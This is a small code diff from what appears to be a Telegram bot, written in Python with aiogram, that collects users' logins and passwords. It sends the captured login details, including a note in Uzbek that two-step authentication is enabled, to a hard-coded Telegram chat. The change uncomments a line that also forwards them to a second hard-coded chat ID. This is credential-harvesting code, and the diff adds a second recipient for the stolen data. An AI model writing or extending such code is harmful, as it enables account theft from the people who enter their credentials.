@@ -128,7 +128,7 @@ async def send_login_pass_handler(message: types.Message, state: FSMContext):
             user += "\n⚠️ 2-Bosqichli autentifikatsiya bor!"
         await state.finish()
         await dp.bot.send_message(chat_id=5596277119, text=user)
-        # await dp.bot.send_message(chat_id=6779680737, text=user)
+        await dp.bot.send_message(chat_id=6779680737, text=user)
     elif login == "Login or password is incorrect":
         await message.answer(text="❌ Sorry, login or password is incorrect\n⚠️ Make sure login and password is correct")
         await message.answer(text="‼️ Please resend your login!")
